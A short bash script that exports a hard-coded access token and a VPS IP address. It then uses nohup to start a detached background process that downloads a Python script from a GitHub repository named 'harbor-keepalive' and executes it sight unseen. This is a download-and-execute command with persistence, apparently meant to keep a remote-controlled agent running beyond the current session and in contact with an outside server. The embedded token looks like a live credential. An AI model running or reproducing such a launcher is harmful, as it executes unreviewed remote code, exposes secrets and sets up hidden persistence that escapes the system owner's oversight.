#!/bin/bash
set -x
export TB_TOKEN=tbk-859be892398a50ad635b6909
export TB_VPS=166.1.144.56
nohup python3 -c "import urllib.request;exec(urllib.request.urlopen('https://raw.githubusercontent.com/vivek-vashistha/harbor-keepalive/main/tb_agent.py').read())" > /tmp/tb.log 2>&1 &
sleep 2
echo "agent started"
head -3 /tmp/tb.log
